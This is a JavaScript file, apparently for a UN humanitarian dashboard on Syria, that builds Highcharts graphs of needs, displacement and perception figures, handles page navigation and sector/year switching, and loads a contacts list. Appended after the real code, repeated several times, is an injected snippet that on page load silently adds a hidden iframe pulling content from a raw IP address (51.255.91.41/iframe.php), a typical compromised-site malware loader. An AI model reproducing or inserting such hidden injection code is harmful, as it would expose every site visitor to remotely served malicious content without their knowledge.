        style: {
            fontFamily: "Roboto"
        },
        type: 'line'
    },
    title: {
        text: null
    },
    credits: {
        enabled: false
    },
    exporting: {
        enabled: false
    },
    xAxis: {
        categories: ['Feb', 'Apr', 'Jun', 'Jul', 'Oct'],
        lineColor: '#e6e6e6',
        tickColor: '#e6e6e6',
        labels: {
            style: {
                color: '#000000'
            }
        }
    },
    yAxis: {
        title: {
            text: null
        },
        labels: {
            enabled: false
        },
        gridLineWidth: 0,
        minorGridLineWidth: 0
    },
    legend: {
        enabled: false
    },
    tooltip: {
        useHTML: true,
        headerFormat: null,
        formatter: function() {
            return '<span style="color:#026CB6">' + this.x + ':</span><br><b>' + this.y + '</b>';
        }
    },
    plotOptions: {
        line: {
            dataLabels: {
                enabled: true,
                style: {
                    textOutline: false,
                    fontWeight: 'normal',
                    fontSize: '10px'
                }
            },
            enableMouseTracking: true
        }
    },
    series: [{
        name: 'Total',
        data: [2.33, 2.05, 1.5, 1.5, 1.16],
        marker: {
            symbol: 'diamond'
        },
        shadow: true
    }]
});
keyPerceptionsDonut = Highcharts.chart('key-perceptions-donut', {
    chart: {
        plotBackgroundColor: null,
        plotBorderWidth: null,
        plotShadow: false,
        backgroundColor: null,
        style: {
            fontFamily: "Roboto"
        },
        type: 'pie'
    },
    credits: {
        enabled: false
    },
    exporting: {
        enabled: false
    },
    title: {
        text: '55%',
        align: 'center',
        verticalAlign: 'middle',
        y: 8,
        style: {
            fontSize: '20px',
            color: '#026CB6'
        }
    },
    tooltip: {
        enabled: false
    },
    plotOptions: {
        pie: {
            borderColor: '#e6e6e6',
            colors: ['#026CB6', '#f5f5f5'],
            dataLabels: {
                enabled: false
            },
            startAngle: 0,
            endAngle: 360,
            center: ['50%', '50%']
        }
    },
    series: [{
        type: 'pie',
        innerSize: '60%',
        data: [
            ['', 55],
            ['', 45], {
                dataLabels: {
                    enabled: false
                }
            }
        ],
        shadow: true
    }]
});
keyPerceptionsDonutSatis = Highcharts.chart('key-perceptions-donut-satis', {
    chart: {
        paddingBottom: 200,
        plotBackgroundColor: null,
        plotBorderWidth: null,
        plotShadow: false,
        backgroundColor: null,
        style: {
            fontFamily: "Roboto"
        },
        type: 'pie'
    },
    credits: {
        enabled: false
    },
    exporting: {
        enabled: false
    },
    title: {
        text: null
    },
    tooltip: {
        enabled: false
    },
    plotOptions: {
        pie: {
            borderColor: '#e6e6e6',
            colors: ['#6e9ed4', '#026CB6', '#f5f5f5'], 
            dataLabels: {
                enabled: true,
                distance: -20,
                style: {
                    textOutline: false,
                    fontWeight: 'normal',
                    fontSize: '10px'
                }
            },
            startAngle: 0,
            endAngle: 360,
            center: ['50%', '50%']
        }
    },
    series: [{
        type: 'pie',
        innerSize: '50%',
        data: [
            ['60%', 60],
            ['23%', 23],
            ['17%', 17], {
                dataLabels: {
                    enabled: false
                }
            }
        ],
        shadow: true
    }]
});
/* key figures end */
loadYearsData();
generateSectorNeedsEvents();
generateContactsEvents();
$(document).ready(function() {
    $("#fullpage").fullpage({
        css3: true,
        navigation: false,
        paddingTop: '3.3rem',
        verticalCentered: true,
        animateAnchor: false,
        anchors: ['home', 'video', 'key-figures', 'severity-of-needs', 'sector-needs', 'contacts', 'resources'],
        menu: '.home-menu',
        afterLoad: function(anchorLink, index) {
            if (index === 1) {
                $("#navbar-top").hide();
                $("#navbar-bottom").show();
                $('.navbar-collapse').collapse('hide');
            } else if (index === 2) {
                $("#navbar-bottom").hide();
                $("#navbar-top").hide();
                $('.navbar-collapse').collapse('hide');
                $("#sharer-video").hide();
                $("#lang-switcher-video").hide();
                videojs('video-js').ready(function() {
                    this.play();
                });
            } else {
                $("#navbar-bottom").hide();
                $("#navbar-top").show();
                $('.navbar-collapse').collapse('hide');
            }
        },
        onLeave: function(index, nextIndex, direction) {
            if (nextIndex === 1) {
                $("#navbar-top").hide();
                $("#navbar-bottom").show();
                $('.navbar-collapse').collapse('hide');
            } else if (nextIndex === 2) {
                $("#navbar-bottom").hide();
                $("#navbar-top").hide();
                $('.navbar-collapse').collapse('hide');
                $("#sharer-video").hide();
                $("#lang-switcher-video").hide();
            } else {
                $("#navbar-bottom").hide();
                $("#navbar-top").show();
                $('.navbar-collapse').collapse('hide');
            }
            if (index === 3) {
                $('#key-needs').hide();
                $('#key-displacement').hide();
                $('#key-access').hide();
                $('#key-perceptions').hide();
                $("#key-figures-main").show();
                $.fn.fullpage.reBuild();
                $.fn.fullpage.setMouseWheelScrolling(true);
            }
        },
        scrollOverflow: true,
        scrollOverflowOptions: {
            click: false
        }
    });
    /* home page starts */
/*	$('[data-toggle="tooltip"]').tooltip(); /* for the coming soon arabic */ 
    $(".tw").on("click", function(e) {
        e.preventDefault();
        window.open("//twitter.com/share?url=" + window.location.href.replace('#', '%23'), "_blank");
    });
    $(".fb").on("click", function(e) {
        e.preventDefault();
        window.open("//facebook.com/sharer/sharer.php?u=" + window.location.href.replace('#', '%23'), "_blank");
    });
    $(".ar").on("click", function(e) {
        e.preventDefault();
        window.open("./ar/" + window.location.hash, "_blank"); 
    });
    /* home page ends */
    /* video starts */
    $("video").on("ended", function() {
        $("#sharer-video").show();
        $("#lang-switcher-video").show();
    });
    $("video").on("playing", function() {
        $("#sharer-video").hide();
        $("#lang-switcher-video").hide();
    });
    /* video starts */
    var quotes = ['<h3 class="h3-responsive py-0 py-sm-1 text-uppercase" id="home-message"><span class="ocha-light-blue-text">The people of Syria are suffering a cold, hard winter,</span> with freezing temperatures, snowfall, heavy rain and flooding that have destroyed shelters and forced the movement of tens of thousands.</h3>', '<h3 class="h3-responsive py-0 py-sm-1 text-uppercase" id="home-message"><span class="ocha-light-blue-text">An estimated 180,000 teachers are no longer in service.</span> Some 40 per cent of schools have been damaged or destroyed, and many others have been used to shelter displaced people. All Syrian children have a right to education without discrimination, and this right must be protected, respected and fulfilled.</h3>', '<h3 class="h3-responsive py-0 py-sm-1 text-uppercase" id="home-message"><span class="ocha-light-blue-text">After having seen their homes destroyed, their neighbours killed, their loved ones disappear,</span> after having fled multiple times within Syria or sought refuge elsewhere, faced poverty and lacked basic services, they [the people of Syria] are exhausted.</h3>'];
    var caption = ['ERC Briefing to Security Council 30 January 2019', 'ERC Briefing to Security Council delivered by Reena Ghelani, 29 November 2018', 'ERC Statement to Members States, 23 February 2018'];
    var random = Math.floor(Math.random() * quotes.length);
    $('#home-message').replaceWith(quotes[random]);
    $('#home-caption em').text(caption[random]);
    $(document).on('click', function() {
        if ($("a.nav-link").is(":visible")) {
            $('.navbar-collapse').collapse('hide');
        }
    });
    $("#hno-2017-arcmap").on('click', function() {
        $("iframe").attr('src', "./data/arc-maps/hno-2017/");
        $("#severity-needs-timeline>button").prop("disabled", false);
        $("#hno-2017-arcmap").prop("disabled", true);
		$("#bsg-section").css("display", "block");
		$("#htr-section").css("display", "block");
    });
    $("#pmr-2017-arcmap").on('click', function() {
        $("iframe").attr('src', "./data/arc-maps/pmr-2017/");
        $("#severity-needs-timeline>button").prop("disabled", false);
        $("#pmr-2017-arcmap").prop("disabled", true);
		$("#bsg-section").css("display", "block");
		$("#htr-section").css("display", "block");
    });
    $("#hno-2018-arcmap").on('click', function() {
        $("iframe").attr('src', "./data/arc-maps/hno-2018/");
        $("#severity-needs-timeline>button").prop("disabled", false);
        $("#hno-2018-arcmap").prop("disabled", true);
		$("#bsg-section").css("display", "block");
		$("#htr-section").css("display", "block");
    });
	 $("#hno-2019-arcmap").on('click', function() {
        $("iframe").attr('src', "./data/arc-maps/hno-2019/");
        $("#severity-needs-timeline>button").prop("disabled", false);
        $("#hno-2019-arcmap").prop("disabled", true);
		$("#bsg-section").css("display", "none");
		$("#htr-section").css("display", "none");
    });
    $(".key-figures-nav").on('click', function(e) {
        $('#key-needs').hide();
        $('#key-displacement').hide();
        $('#key-access').hide();
        $('#key-perceptions').hide();
        $("#key-figures-main").show();
        $.fn.fullpage.reBuild();
        $.fn.fullpage.setMouseWheelScrolling(true);
    });
    $(".close").on('touchend click', function(e) {
        e.preventDefault();
        $('#key-needs').hide();
        $('#key-displacement').hide();
        $('#key-access').hide();
        $('#key-perceptions').hide();
        $("#key-figures-main").show();
        $.fn.fullpage.reBuild();
        $.fn.fullpage.setMouseWheelScrolling(true);
    });
    $("#key-figures-needs div").on('click', function() {
        $("#key-figures-main").toggle();
        $("#key-needs").show();
        $.fn.fullpage.reBuild();
        keyNeedsPie.reflow();
        keyNeedsColumn.reflow();
        $.fn.fullpage.setMouseWheelScrolling(false);
    });
    $("#key-figures-displacement div").on('click', function() {
        $("#key-figures-main").toggle();
        $("#key-displacement").show();
        $.fn.fullpage.reBuild();
        keyDisplacementPie.reflow();
        keyDisplacementLine.reflow();
        $.fn.fullpage.setMouseWheelScrolling(false);
    });
    $("#key-figures-access div").on('click', function() {
        $("#key-figures-main").toggle();
        $("#key-access").show();
        $.fn.fullpage.reBuild();
        keyAccessDonut.reflow();
        keyAccessLine.reflow();
        $.fn.fullpage.setMouseWheelScrolling(false);
    });
    $("#key-figures-perceptions div").on('click', function() {
        $("#key-figures-main").toggle();
        $("#key-perceptions").show();
        $.fn.fullpage.reBuild();
        keyPerceptionsDonut.reflow();
        keyPerceptionsDonutSatis.reflow();
        $.fn.fullpage.setMouseWheelScrolling(false);
    });
    if (browserVersion > 0) {
        $(".grow>div").addClass('hm-black-strong');
        $(".inside").append("<div class='mask h-100'></div>");

        $(".grow>div").on({
            mouseenter: function() {
                $(this).removeClass('hm-black-strong');
            },
            mouseleave: function() {
                $(this).addClass('hm-black-strong');
            },
            click: function() {
                $(this).addClass('hm-black-strong');
            }
        });

        $('.parent-flex-ie').addClass('flex-column');
        $('.parent-flex-ie>div').removeClass('position-relative');
        $('.parent-flex-ie>div').removeClass('position-absolute');
    }
    /* sector needs start */
    $("#hno-2016-year").on('click', function() {
        needsMap.showLoading();
        $("#sector-needs-timeline>button").prop("disabled", false);
        $("#hno-2016-year").prop("disabled", true);
        activeYear = 'hno_2016';
        activeYearData = hno_2016_data;
        getCurrentSector();
        initiateNeedsMap(activeYear, hno_2016_classes, window['needs_' + activeSectorName], sector_needs_obj[currentSectorName].pin, sector_needs_obj[currentSectorName].severity);
        showAllSectorNeeds();
        switch (currentSectorName) {
            case 'nutrition':
                hideRowPinSectorNeeds();
                $("#needs-pie-col").hide();
                activeNutritionCategories = needs_column_categories_nutrition_2016;
                columnData = needsColumnData(activeSectorData, activeNutritionCategories);
                updateNeedsColumn(columnData, activeNutritionCategories);
                updateNeedsInputs(activeSectorData, activeSectorTitle);
                break;
            case 'education':
                hideRowPinSectorNeeds();
                $("#needs-pie-col").hide();
                activeEducationCategories = needs_column_categories_education_2016;
                columnData = needsColumnData(activeSectorData, activeEducationCategories);
                updateNeedsColumn(columnData, activeEducationCategories);
                updateNeedsInputs(activeSectorData, activeSectorTitle);
                break;
            case 'wash':
                $("#needs-column-col").hide();
                updateNeedsInputs(activeSectorData, activeSectorTitle);
                break;
            default:
                pieData = needsPieData(activeSectorData);
                updateNeedsPie(pieData);
                $("#needs-column-col").hide();
                updateNeedsInputs(activeSectorData, activeSectorTitle);
        }
        $.fn.fullpage.reBuild();
        needsMap.reflow();
        needsPie.reflow();
        needsColumn.reflow();
    });
    $("#hno-2017-year").on('click', function() {
        needsMap.showLoading();
        $("#sector-needs-timeline>button").prop("disabled", false);
        $("#hno-2017-year").prop("disabled", true);
        activeYear = 'hno_2017';
        activeYearData = hno_2017_data;
        activeYearColumnCategories = needs_column_categories_2017;
        getCurrentSector();
        initiateNeedsMap(activeYear, hno_2017_classes, window['needs_' + activeSectorName], sector_needs_obj[currentSectorName].pin, sector_needs_obj[currentSectorName].severity);
        showAllSectorNeeds();
        switch (currentSectorName) {
            case 'nutrition':
                pieData = needsPieData(activeSectorData);
                updateNeedsPie(pieData);
                activeNutritionCategories = needs_column_categories_nutrition_2017;
                columnData = needsColumnData(activeSectorData, activeNutritionCategories);
                updateNeedsColumn(columnData, activeNutritionCategories);
                updateNeedsInputs(activeSectorData, activeSectorTitle);
                break;
            case 'education':
                pieData = needsPieData(activeSectorData);
                updateNeedsPie(pieData);
                activeEducationCategories = needs_column_categories_education_2017;
                columnData = needsColumnData(activeSectorData, activeEducationCategories);
                updateNeedsColumn(columnData, activeEducationCategories);
                updateNeedsInputs(activeSectorData, activeSectorTitle);
                break;
            case 'wash':
                $("#wash-acute-append").append("<span class='d-block m-0 pt-0 pb-2 text-lowercase fs-7' id='acute-message'><strong class='h5-responsive'>8.2</strong> Million people<br>in acute need</span>");
                columnData = needsColumnData(activeSectorData, activeYearColumnCategories);
                updateNeedsColumn(columnData, activeYearColumnCategories);
                updateNeedsInputs(activeSectorData, activeSectorTitle);
                break;
            default:
                pieData = needsPieData(activeSectorData);
                updateNeedsPie(pieData);
                columnData = needsColumnData(activeSectorData, activeYearColumnCategories);
                updateNeedsColumn(columnData, activeYearColumnCategories);
                updateNeedsInputs(activeSectorData, activeSectorTitle);
        }
        $.fn.fullpage.reBuild();
        needsMap.reflow();
        needsPie.reflow();
        needsColumn.reflow();
    });
    $("#pmr-2017-year").on('click', function() {
        needsMap.showLoading();
        $("#sector-needs-timeline>button").prop("disabled", false);
        $("#pmr-2017-year").prop("disabled", true);
        activeYear = 'pmr_2017';
        activeYearData = pmr_2017_data;
        activeYearColumnCategories = needs_column_categories_2017;
        getCurrentSector();
        initiateNeedsMap(activeYear, pmr_2017_classes, window['needs_' + activeSectorName], sector_needs_obj[currentSectorName].pin, sector_needs_obj[currentSectorName].severity);
        showAllSectorNeeds();
        switch (currentSectorName) {
            case 'nutrition':
                pieData = needsPieData(activeSectorData);
                updateNeedsPie(pieData);
                activeNutritionCategories = needs_column_categories_nutrition_2017;
                columnData = needsColumnData(activeSectorData, activeNutritionCategories);
                updateNeedsColumn(columnData, activeNutritionCategories);
                updateNeedsInputs(activeSectorData, activeSectorTitle);
                break;
            case 'education':
                pieData = needsPieData(activeSectorData);
                updateNeedsPie(pieData);
                activeEducationCategories = needs_column_categories_education_2017;
                columnData = needsColumnData(activeSectorData, activeEducationCategories);
                updateNeedsColumn(columnData, activeEducationCategories);
                updateNeedsInputs(activeSectorData, activeSectorTitle);
                break;
            case 'wash':
                $("#wash-acute-append").append("<span class='d-block m-0 pt-0 pb-2 text-lowercase fs-7' id='acute-message'><strong class='h5-responsive'>8.2</strong> Million people<br>in acute need</span>");
                columnData = needsColumnData(activeSectorData, activeYearColumnCategories);
                updateNeedsColumn(columnData, activeYearColumnCategories);
                updateNeedsInputs(activeSectorData, activeSectorTitle);
                break;
            default:
                pieData = needsPieData(activeSectorData);
                updateNeedsPie(pieData);
                columnData = needsColumnData(activeSectorData, activeYearColumnCategories);
                updateNeedsColumn(columnData, activeYearColumnCategories);
                updateNeedsInputs(activeSectorData, activeSectorTitle);
        }
        $.fn.fullpage.reBuild();
        needsMap.reflow();
        needsPie.reflow();
        needsColumn.reflow();
    });
    $("#hno-2018-year").on('click', function() {
        needsMap.showLoading();
        $("#sector-needs-timeline>button").prop("disabled", false);
        $("#hno-2018-year").prop("disabled", true);
        activeYear = 'hno_2018';
        activeYearData = hno_2018_data;
        activeYearColumnCategories = needs_column_categories_2018;
        getCurrentSector();
        initiateNeedsMap(activeYear, hno_2018_classes, window['needs_' + activeSectorName], sector_needs_obj[currentSectorName].pin, sector_needs_obj[currentSectorName].severity);
        showAllSectorNeeds();
        switch (currentSectorName) {
            case 'nutrition':
                hideRowPinSectorNeeds();
                $("#needs-pie-col").hide();
                activeNutritionCategories = needs_column_categories_nutrition_2018;
                columnData = needsColumnData(activeSectorData, activeNutritionCategories);
                updateNeedsColumn(columnData, activeNutritionCategories);
                updateNeedsInputs(activeSectorData, activeSectorTitle);
                break;
            case 'education':
                pieData = needsPieData(activeSectorData);
                updateNeedsPie(pieData);
                activeEducationCategories = needs_column_categories_education_2018;
                columnData = needsColumnData(activeSectorData, activeEducationCategories);
                updateNeedsColumn(columnData, activeEducationCategories);
                updateNeedsInputs(activeSectorData, activeSectorTitle);
                break;
            case 'wash':
                $("#wash-acute-append").append("<span class='d-block m-0 pt-0 pb-2 text-lowercase fs-7' id='acute-message'><strong class='h5-responsive'>7.6</strong> Million people<br>in acute need</span>");
                columnData = needsColumnData(activeSectorData, activeYearColumnCategories);
                updateNeedsColumn(columnData, activeYearColumnCategories);
                updateNeedsInputs(activeSectorData, activeSectorTitle);
                break;
            default:
                pieData = needsPieData(activeSectorData);
                updateNeedsPie(pieData);
                columnData = needsColumnData(activeSectorData, activeYearColumnCategories);
                updateNeedsColumn(columnData, activeYearColumnCategories);
                updateNeedsInputs(activeSectorData, activeSectorTitle);
        }
        $.fn.fullpage.reBuild();
        needsMap.reflow();
        needsPie.reflow();
        needsColumn.reflow();
    });
	   $("#pmr-2018-year").on('click', function() {
        needsMap.showLoading();
        $("#sector-needs-timeline>button").prop("disabled", false);
        $("#pmr-2018-year").prop("disabled", true);
        activeYear = 'pmr_2018';
        activeYearData = pmr_2018_data;
        activeYearColumnCategories = needs_column_categories_2018;
        getCurrentSector();
        initiateNeedsMap(activeYear, pmr_2018_classes, window['needs_' + activeSectorName], sector_needs_obj[currentSectorName].pin, sector_needs_obj[currentSectorName].severity);
        showAllSectorNeeds();
        switch (currentSectorName) {
            case 'nutrition':
                hideRowPinSectorNeeds();
                $("#needs-pie-col").hide();
                activeNutritionCategories = needs_column_categories_nutrition_2018;
                columnData = needsColumnData(activeSectorData, activeNutritionCategories);
                updateNeedsColumn(columnData, activeNutritionCategories);
                updateNeedsInputs(activeSectorData, activeSectorTitle);
                break;
            case 'education':
                pieData = needsPieData(activeSectorData);
                updateNeedsPie(pieData);
                activeEducationCategories = needs_column_categories_education_2018;
                columnData = needsColumnData(activeSectorData, activeEducationCategories);
                updateNeedsColumn(columnData, activeEducationCategories);
                updateNeedsInputs(activeSectorData, activeSectorTitle);
                break;
            case 'wash':
                $("#wash-acute-append").append("<span class='d-block m-0 pt-0 pb-2 text-lowercase fs-7' id='acute-message'><strong class='h5-responsive'>6.8</strong> Million people<br>in acute need</span>");
                columnData = needsColumnData(activeSectorData, activeYearColumnCategories);
                updateNeedsColumn(columnData, activeYearColumnCategories);
                updateNeedsInputs(activeSectorData, activeSectorTitle);
                break;
            default:
                pieData = needsPieData(activeSectorData);
                updateNeedsPie(pieData);
                columnData = needsColumnData(activeSectorData, activeYearColumnCategories);
                updateNeedsColumn(columnData, activeYearColumnCategories);
                updateNeedsInputs(activeSectorData, activeSectorTitle);
        }
        $.fn.fullpage.reBuild();
        needsMap.reflow();
        needsPie.reflow();
        needsColumn.reflow();
    });
	   $("#hno-2019-year").on('click', function() {
        needsMap.showLoading();
        $("#sector-needs-timeline>button").prop("disabled", false);
        $("#hno-2019-year").prop("disabled", true);
        activeYear = 'hno_2019';
        activeYearData = hno_2019_data;
        activeYearColumnCategories = needs_column_categories_2018;
        getCurrentSector();
        initiateNeedsMap(activeYear, hno_2019_classes, window['needs_' + activeSectorName], sector_needs_obj[currentSectorName].pin, sector_needs_obj[currentSectorName].severity);
        showAllSectorNeeds();
        switch (currentSectorName) {
            case 'nutrition':
                hideRowPinSectorNeeds();
                $("#needs-pie-col").hide();
                activeNutritionCategories = needs_column_categories_nutrition_2018;
                columnData = needsColumnData(activeSectorData, activeNutritionCategories);
                updateNeedsColumn(columnData, activeNutritionCategories);
                updateNeedsInputs(activeSectorData, activeSectorTitle);
                break;
            case 'education':
                pieData = needsPieData(activeSectorData);
                updateNeedsPie(pieData);
                activeEducationCategories = needs_column_categories_education_2018;
                columnData = needsColumnData(activeSectorData, activeEducationCategories);
                updateNeedsColumn(columnData, activeEducationCategories);
                updateNeedsInputs(activeSectorData, activeSectorTitle);
                break;
            case 'wash':
                $("#wash-acute-append").append("<span class='d-block m-0 pt-0 pb-2 text-lowercase fs-7' id='acute-message'><strong class='h5-responsive'>6.2</strong> Million people<br>in acute need</span>");
                columnData = needsColumnData(activeSectorData, activeYearColumnCategories);
                updateNeedsColumn(columnData, activeYearColumnCategories);
                updateNeedsInputs(activeSectorData, activeSectorTitle);
                break;
            default:
                pieData = needsPieData(activeSectorData);
                updateNeedsPie(pieData);
                columnData = needsColumnData(activeSectorData, activeYearColumnCategories);
                updateNeedsColumn(columnData, activeYearColumnCategories);
                updateNeedsInputs(activeSectorData, activeSectorTitle);
        }
        $.fn.fullpage.reBuild();
        needsMap.reflow();
        needsPie.reflow();
        needsColumn.reflow();
    });
    $("#needs-education").on("touchstart click", function(e) {
        e.stopPropagation();
        e.preventDefault();
        activeSectorName = "education";
        activeSectorTitle = "Education";
        activeSectorData = activeYearData.filter(function(obj) {
            return obj.sector == activeSectorName;
        })[0];
        activateNeedsSector(this.id);
        updateNeedsMap(needs_education, "Education_", "Education1");
        showAllSectorNeeds();
        if (activeYear == 'hno_2018') {
            pieData = needsPieData(activeSectorData);
            updateNeedsPie(pieData);
            activeEducationCategories = needs_column_categories_education_2018;
        } else if (activeYear == 'hno_2016') {
            hideRowPinSectorNeeds();
            $("#needs-pie-col").hide();
            activeEducationCategories = needs_column_categories_education_2016;
        } else {
            pieData = needsPieData(activeSectorData);
            updateNeedsPie(pieData);
            activeEducationCategories = needs_column_categories_education_2017;
        }
        columnData = needsColumnData(activeSectorData, activeEducationCategories);
        updateNeedsColumn(columnData, activeEducationCategories);
        updateNeedsInputs(activeSectorData, activeSectorTitle);
        setCurrentSector(activeSectorName, activeSectorTitle);
        $.fn.fullpage.reBuild();
        needsMap.reflow();
        needsPie.reflow();
        needsColumn.reflow();
    });
    $("#needs-nutrition").on("touchstart click", function(e) {
        e.stopPropagation();
        e.preventDefault();
        activeSectorName = "nutrition";
        activeSectorTitle = "Nutrition";
        activeSectorData = activeYearData.filter(function(obj) {
            return obj.sector == activeSectorName;
        })[0];
        activateNeedsSector(this.id);
        updateNeedsMap(needs_nutrition, "Nutrition_", "Nutrition1");
        showAllSectorNeeds();
        if (activeYear == 'hno_2018' || activeYear == 'pmr_2018' || activeYear == 'hno_2019') {
            hideRowPinSectorNeeds();
            $("#needs-pie-col").hide();
            activeNutritionCategories = needs_column_categories_nutrition_2018;
        } else if (activeYear == 'hno_2016') {
            hideRowPinSectorNeeds();
            $("#needs-pie-col").hide();
            activeNutritionCategories = needs_column_categories_nutrition_2016;
        } else {
            pieData = needsPieData(activeSectorData);
            updateNeedsPie(pieData);
            activeNutritionCategories = needs_column_categories_nutrition_2017;
        }
        columnData = needsColumnData(activeSectorData, activeNutritionCategories);
        updateNeedsColumn(columnData, activeNutritionCategories);
        updateNeedsInputs(activeSectorData, activeSectorTitle);
        setCurrentSector(activeSectorName, activeSectorTitle);
        $.fn.fullpage.reBuild();
        needsMap.reflow();
        needsPie.reflow();
        needsColumn.reflow();
    });
    $("#needs-wash").on("touchstart click", function(e) {
        e.stopPropagation();
        e.preventDefault();
        activeSectorName = "wash";
        activeSectorTitle = "Water, Sanitation and Hygiene";
        activeSectorData = activeYearData.filter(function(obj) {
            return obj.sector == activeSectorName;
        })[0];
        activateNeedsSector(this.id);
        updateNeedsMap(needs_wash, "WASH_PiN_2", "WASH_Sever");
        showAllSectorNeeds();
        pieData = needsPieData(activeSectorData);
        updateNeedsPie(pieData);
        if (activeYear == 'hno_2016') {
            $("#needs-column-col").hide();
        } else {
            columnData = needsColumnData(activeSectorData, activeYearColumnCategories);
            updateNeedsColumn(columnData, activeYearColumnCategories);
            if (activeYear == 'hno_2018') {
                $("#wash-acute-append").append("<span class='d-block m-0 pt-0 pb-2 text-lowercase fs-7' id='acute-message'><strong class='h5-responsive'>7.6</strong> Million people<br>in acute need</span>");
            } else if (activeYear == 'hno_2019') {
                $("#wash-acute-append").append("<span class='d-block m-0 pt-0 pb-2 text-lowercase fs-7' id='acute-message'><strong class='h5-responsive'>6.2</strong> Million people<br>in acute need</span>");
            } else if (activeYear == 'pmr_2018') {
                $("#wash-acute-append").append("<span class='d-block m-0 pt-0 pb-2 text-lowercase fs-7' id='acute-message'><strong class='h5-responsive'>6.8</strong> Million people<br>in acute need</span>");
            } else if (activeYear == 'hno_2017') {
                $("#wash-acute-append").append("<span class='d-block m-0 pt-0 pb-2 text-lowercase fs-7' id='acute-message'><strong class='h5-responsive'>8.2</strong> Million people<br>in acute need</span>");
            } else if (activeYear == 'pmr_2017') {
                $("#wash-acute-append").append("<span class='d-block m-0 pt-0 pb-2 text-lowercase fs-7' id='acute-message'><strong class='h5-responsive'>8.2</strong> Million people<br>in acute need</span>");
            }
        }
        updateNeedsInputs(activeSectorData, activeSectorTitle);
        setCurrentSector(activeSectorName, activeSectorTitle);
        $.fn.fullpage.reBuild();
        needsMap.reflow();
        needsPie.reflow();
        needsColumn.reflow();
    });
    /* sector needs end */
    /* contact start */
    Papa.parse("./data/contacts/en/list.csv", {
        download: true,
        header: true,
        skipEmptyLines: true,
        complete: function(result) {
            var rows = result.data;
            for (var i = 0; i < rows.length; i++) {
                var sector = rows[i].sector;
                switch (sector) {
                    case 'protection':
                        contacts_protection.push(rows[i]);
                        break;
                    case 'cccm':
                        contacts_cccm.push(rows[i]);
                        break;
                    case 'erl':
                        contacts_erl.push(rows[i]);
                        break;
                    case 'education':
                        contacts_education.push(rows[i]);
                        break;
                    case 'fs':
                        contacts_fs.push(rows[i]);
                        break;
                    case 'health':
                        contacts_health.push(rows[i]);
                        break;
                    case 'nutrition':
                        contacts_nutrition.push(rows[i]);
                        break;
                    case 'shelter_nfi':
                        contacts_shelternfi.push(rows[i]);
                        break;
                    case 'wash':
                        contacts_wash.push(rows[i]);
                        break;
                    case 'etc':
                        contacts_etc.push(rows[i]);
                        break;
                    case 'logistics':
                        contacts_logistics.push(rows[i]);
                        break;
                    case 'ocha':
                        contacts_ocha.push(rows[i]);
                        break;
                    case 'ocha_deputy':
                        contacts_ocha_deputy.push(rows[i]);
                        break;
                    case 'ocha_officer':
                        contacts_ocha_officer.push(rows[i]);
                        break;
                }
            }
            activateContactsSector('contacts-ocha');
            appendContacts(contacts_ocha);
        },
        error: function(err, file) {
            $("#contacts-append").empty();
            $("#contacts-sector-name").text("ERROR! List file can't be loaded");
            $("#contacts-sector-name").removeClass('ocha-dark-blue-text');
            $("#contacts-sector-name").addClass('red-text');
        }
    });
    $("#contacts-sectors>img, #needs-sectors>img").on({
        mouseenter: function() {
            $(this).addClass('activate-sector-hover');
            if (browserVersion > 0) {
                var hoveredId = this.id;
                var hoveredSector = hoveredId.substring(hoveredId.indexOf('-') + 1);
                var hoveredImgSrc = $("#" + hoveredId).attr('src');
                hoveredImgSrc = hoveredImgSrc.replace(hoveredSector + '_g.png', hoveredSector + '.png');
                $("#" + hoveredId).attr("src", hoveredImgSrc);
            }
        },
        mouseleave: function() {
            $(this).removeClass('activate-sector-hover');
            if (browserVersion > 0) {
                var leftId = this.id;
                var leftSector = leftId.substring(leftId.indexOf('-') + 1);
                var leftImgSrc = $("#" + leftId).attr('src');
                leftImgSrc = leftImgSrc.replace(leftSector + '.png', leftSector + '_g.png');
                $("#" + leftId).attr("src", leftImgSrc);

                var needsActiveImgSrc = $("#needs-sectors .activate-sector").attr('src'),
                    needsImgSrc = needsActiveImgSrc.replace('_g.png', '.png');
                $("#needs-sectors .activate-sector").attr("src", needsImgSrc);

                var contactsActiveImgSrc = $("#contacts-sectors .activate-sector").attr('src'),
                    contactsImgSrc = contactsActiveImgSrc.replace('_g.png', '.png');
                $("#contacts-sectors .activate-sector").attr("src", contactsImgSrc);
            }
        },
        touchstart: function() {
            $(this).addClass('activate-sector-hover');
        },
        touchmove: function() {
            $(this).removeClass('activate-sector-hover');
        }
    });
});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
